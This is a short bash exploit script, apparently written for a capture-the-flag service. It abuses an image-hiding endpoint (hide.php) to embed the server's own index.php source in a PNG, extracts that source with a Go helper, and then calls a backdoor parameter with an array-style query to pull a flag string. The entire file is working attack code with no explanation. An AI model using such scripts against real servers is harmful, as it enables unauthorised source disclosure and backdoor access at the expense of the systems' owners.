#!/bin/bash

TARGET="$1";
curl -XPOST -F "url=./index.php" -F "userfile=@space.png" "http://$TARGET:40040/hide.php" > imageWithIndex.png

go run extract.go imageWithIndex.png | strings | head -n 10

curl "http://$TARGET:40040/index.php?s3cr3tBaCkD00r\[\]=" | grep Sabantuy